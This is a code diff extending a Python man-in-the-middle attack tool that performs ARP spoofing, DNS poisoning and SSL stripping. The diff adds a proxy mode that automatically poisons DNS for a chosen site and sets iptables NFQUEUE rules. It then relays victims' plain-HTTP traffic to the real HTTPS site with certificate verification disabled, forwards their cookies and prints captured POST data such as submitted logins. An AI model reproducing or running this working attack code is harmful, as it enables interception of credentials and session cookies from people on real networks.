@@ -18,6 +18,7 @@ from typing import Optional
 
 # network
 HTTPS_PORT = 443
+HTTP_PORT = 80
 NETWORK_SCAN_TIMEOUT = 10
 ARP_REQUEST_TIMEOUT = 2
 ARP_REQUEST_RETRIES = 2
@@ -37,7 +38,7 @@ HTTP_SERVER_TIMEOUT = 1.0
 ARP_SPOOF_INTERVAL = 2  # seconds between spoof packets
 ARP_RESTORE_COUNT = 4   # packets sent when restoring ARP
 
-# dns thrads
+# dns threads
 DNS_POLL_INTERVAL = 0.01
 
 # ssl certs
@@ -67,7 +68,9 @@ cleanup_state = {
     'dns_queue': None,
     'ssl_strip_thread': None,
     'ssl_strip_running': False,
-    'ssl_httpd': None
+    'ssl_httpd': None,
+    'proxy_thread': None,
+    'proxy_running': False
 }
 
 # all the services must be properly stopped and the system state restored
@@ -75,6 +78,10 @@ cleanup_state = {
 def cleanup():
     try:
         print("\n[Cleanup] Restoring system state...")
+        #stop proxy
+        if cleanup_state['proxy_running']:
+            cleanup_state['proxy_running'] = False
+            print("[Cleanup] Proxy stopped")
         #stop ssl stripping
         if cleanup_state['ssl_strip_running']:
             cleanup_state['ssl_strip_running'] = False
@@ -295,7 +302,7 @@ def dns_poison_thread():
                 queue.run(block=False)
             except Exception:
                 pass
-            time.sleep(DNS_POLL_INTERVAL)  # Small sleep to prevent CPU spinning
+            time.sleep(DNS_POLL_INTERVAL) 
             
     except Exception as e:
         print(f"[DNS] Error in DNS thread: {e}")
@@ -345,7 +352,7 @@ def start_dns_poisoning():
     print("[DNS] You can now start SSL stripping or other attacks")
 
 def stop_dns_poisoning():
-    """Stop DNS poisoning."""
+
     if not cleanup_state['dns_running']:
         print("[DNS] DNS poisoning is not running")
         return
@@ -379,13 +386,98 @@ class _RedirectHandler(http.server.BaseHTTPRequestHandler):
         return
 
     def do_GET(self):
-        print(f"[SSL] Redirecting HTTPS request from {self.client_address[0]} to http://{self.target_host}")
+        print(f"[SSL] Redirecting HTTPS request from {self.client_address[0]} to http://{self.target_host}{self.path}")
         self.send_response(301)
-        self.send_header("Location", f"http://{self.target_host}")
+        self.send_header("Location", f"http://{self.target_host}{self.path}")
         self.end_headers()
 
     def do_POST(self):
         self.do_GET()
+
+
+class _ProxyHandler(http.server.BaseHTTPRequestHandler):
+    # http proxy to fetch real https site
+    target_host: Optional[str] = None
+    target_ip: Optional[str] = None 
+
+    def log_message(self, format, *args):
+        return
+
+    def _proxy_request(self, method='GET', body=None):
+        import socket
+        import ssl
+        
+        connect_host = self.target_ip if self.target_ip else self.target_host
+        
+        try:
+            sock = socket.create_connection((connect_host, 443), timeout=10)
+            
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            ssl_sock = ctx.wrap_socket(sock, server_hostname=self.target_host)
+            
+            headers = {
+                'Host': self.target_host,
+                'Connection': 'close'
+            }
+            for header in ['User-Agent', 'Accept', 'Accept-Language', 'Cookie', 'Content-Type']:
+                if header in self.headers:
+                    headers[header] = self.headers[header]
+            
+            request_line = f"{method} {self.path} HTTP/1.1\r\n"
+            header_lines = "".join(f"{k}: {v}\r\n" for k, v in headers.items())
+            if body:
+                header_lines += f"Content-Length: {len(body)}\r\n"
+            request = request_line + header_lines + "\r\n"
+            
+            ssl_sock.sendall(request.encode())
+            if body:
+                ssl_sock.sendall(body)
+            
+            response = b""
+            while True:
+                chunk = ssl_sock.recv(4096)
+                if not chunk:
+                    break
+                response += chunk
+            ssl_sock.close()
+            
+            header_end = response.find(b"\r\n\r\n")
+            header_data = response[:header_end].decode('utf-8', errors='ignore')
+            content = response[header_end + 4:]
+            status_line = header_data.split("\r\n")[0]
+            status_code = int(status_line.split(" ")[1])
+            
+            content_type = "text/html"
+            for line in header_data.split("\r\n"):
+                if line.lower().startswith("content-type:"):
+                    content_type = line.split(":", 1)[1].strip()
+                    break
+            
+            self.send_response(status_code)
+            self.send_header('Content-Type', content_type)
+            self.send_header('Content-Length', len(content))
+            self.end_headers()
+            self.wfile.write(content)
+                
+        except Exception as e:
+            print(f"[Proxy] Error fetching https://{connect_host}{self.path}: {e}")
+            self.send_response(502)
+            self.end_headers()
+
+    def do_GET(self):
+        print(f"[Proxy] GET {self.path} from {self.client_address[0]}")
+        self._proxy_request('GET')
+
+    def do_POST(self):
+        content_length = int(self.headers.get('Content-Length', 0))
+        body = self.rfile.read(content_length)
+        
+        print(f"[Proxy] POST {self.path} from {self.client_address[0]}")
+        print(f"[Proxy] >>> POST DATA: {body.decode('utf-8', errors='ignore')}")
+        
+        self._proxy_request('POST', body)
 
 
 def _ensure_self_signed_cert(cert_file: str, key_file: str) -> None:
@@ -456,6 +548,8 @@ def _ssl_strip_thread(bind_ip: str, site_to_spoof: str, cert_file: str, key_file
 
 
 def start_ssl_stripping():
+    global website_to_spoof, spoof_ip
+    
     if os.geteuid() != 0:
         print("This action requires root privileges. Please run as root.")
         return
@@ -471,6 +565,8 @@ def start_ssl_stripping():
         if choice.lower() != 'y':
             return
     
+    proxy_mode = not cleanup_state['dns_running']
+    
     site_to_spoof = input("Enter the website to strip SSL from (e.g., example.com): ")
     try:
         bind_ip = scapy.get_if_addr(scapy.conf.iface)
@@ -483,10 +579,43 @@ def start_ssl_stripping():
     cert_file = SSL_CERT_FILE
     key_file = SSL_KEY_FILE
     
-    print(f"[SSL] SSL STRIP")
+    print(f"[SSL] SSL STRIP {'(PROXY MODE)' if proxy_mode else ''}")
     print(f"[SSL] Interface: {scapy.conf.iface}")
     print(f"[SSL] Binding HTTPS redirector on {bind_ip}:{HTTPS_PORT}")
-    print(f"[SSL] Redirect target: http://{site_to_spoof}")
+    
+    if proxy_mode:
+        print(f"[SSL] Proxy will fetch from https://{site_to_spoof}")
+        
+        import socket
+        try:
+            target_ip = socket.gethostbyname(site_to_spoof)
+            print(f"[SSL] Resolved {site_to_spoof} -> {target_ip}")
+        except socket.gaierror:
+            print(f"[SSL] Warning: Could not resolve {site_to_spoof}, proxy may fail")
+            target_ip = None
+        
+        print(f"[SSL] Auto-starting DNS poisoning: {site_to_spoof} -> {bind_ip}")
+        website_to_spoof = site_to_spoof
+        spoof_ip = bind_ip
+        
+        if not cleanup_state['ip_forward_enabled']:
+            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+            cleanup_state['ip_forward_enabled'] = True
+        
+        os.system(f"iptables -I FORWARD -j NFQUEUE --queue-num {NFQUEUE_NUM}")
+        os.system(f"iptables -I INPUT -j NFQUEUE --queue-num {NFQUEUE_NUM}")
+        cleanup_state['iptables_set'] = True
+        
+        cleanup_state['dns_running'] = True
+        cleanup_state['dns_thread'] = threading.Thread(
+            target=dns_poison_thread,
+            daemon=True
+        )
+        cleanup_state['dns_thread'].start()
+        print(f"[SSL] DNS poisoning auto-started")
+    else:
+        print(f"[SSL] Redirect target: http://{site_to_spoof}")
+        target_ip = None
     
     _ensure_self_signed_cert(cert_file, key_file)
     
@@ -498,6 +627,10 @@ def start_ssl_stripping():
         daemon=True
     )
     cleanup_state['ssl_strip_thread'].start()
+    
+    if proxy_mode:
+        start_proxy(bind_ip, site_to_spoof, target_ip)
+    
     print("[SSL] SSL stripping started in background")
 
 
@@ -514,7 +647,78 @@ def stop_ssl_stripping():
         cleanup_state['ssl_strip_thread'].join(timeout=THREAD_JOIN_TIMEOUT_MEDIUM)
         cleanup_state['ssl_strip_thread'] = None
     
+    if cleanup_state['proxy_running']:
+        stop_proxy()
+    
+    if cleanup_state['dns_running']:
+        stop_dns_poisoning()
+    
     print("[SSL] Done.")
+
+
+def _proxy_thread(bind_ip: str, site_to_spoof: str, target_ip: Optional[str] = None) -> None:
+    """Background thread for HTTP proxy server."""
+    _ProxyHandler.target_host = site_to_spoof
+    _ProxyHandler.target_ip = target_ip
+    socketserver.TCPServer.allow_reuse_address = True
+    
+    try:
+        httpd = socketserver.TCPServer((bind_ip, HTTP_PORT), _ProxyHandler)
+        cleanup_state['proxy_httpd'] = httpd
+        
+        print(f"[Proxy] Listening on {bind_ip}:{HTTP_PORT}")
+        if target_ip:
+            print(f"[Proxy] Fetching via IP: {target_ip} (Host: {site_to_spoof})")
+        else:
+            print(f"[Proxy] Proxying to https://{site_to_spoof}")
+        
+        httpd.timeout = HTTP_SERVER_TIMEOUT
+        
+        while cleanup_state['proxy_running']:
+            httpd.handle_request()
+            
+    except OSError as exc:
+        if exc.errno == errno.EACCES:
+            print(f"[Proxy] Permission denied binding to port {HTTP_PORT}. Run with sudo/root.")
+        elif exc.errno == errno.EADDRINUSE:
+            print(f"[Proxy] Port {HTTP_PORT} is already in use.")
+        else:
+            print(f"[Proxy] Failed to start proxy: {exc}")
+        cleanup_state['proxy_running'] = False
+    except Exception as e:
+        print(f"[Proxy] Error: {e}")
+        cleanup_state['proxy_running'] = False
+
+
+def start_proxy(bind_ip: str, site_to_spoof: str, target_ip: Optional[str] = None):
+    """Start the HTTP proxy."""
+    if cleanup_state['proxy_running']:
+        print("[Proxy] Proxy is already running!")
+        return
+    
+    cleanup_state['proxy_running'] = True
+    cleanup_state['proxy_thread'] = threading.Thread(
+        target=_proxy_thread,
+        args=(bind_ip, site_to_spoof, target_ip),
+        daemon=True
+    )
+    cleanup_state['proxy_thread'].start()
+    print("[Proxy] HTTP proxy started in background")
+
+
+def stop_proxy():
+    """Stop the HTTP proxy."""
+    if not cleanup_state['proxy_running']:
+        return
+    
+    print("[Proxy] Stopping proxy...")
+    cleanup_state['proxy_running'] = False
+    
+    if cleanup_state['proxy_thread']:
+        cleanup_state['proxy_thread'].join(timeout=THREAD_JOIN_TIMEOUT_MEDIUM)
+        cleanup_state['proxy_thread'] = None
+    
+    print("[Proxy] Done.")
 
 menu_lines_count = 0
 
@@ -541,7 +745,10 @@ def print_menu(clear_previous=True):
     else:
         lines.append("2. Stop DNS poisoning")
     if not cleanup_state['ssl_strip_running']:
-        lines.append("3. Start SSL stripping")
+        if cleanup_state['dns_running']:
+            lines.append("3. Start SSL stripping")
+        else:
+            lines.append("3. Start SSL stripping (proxy)")
     else:
         lines.append("3. Stop SSL stripping")
     lines.append("4. Scan network")
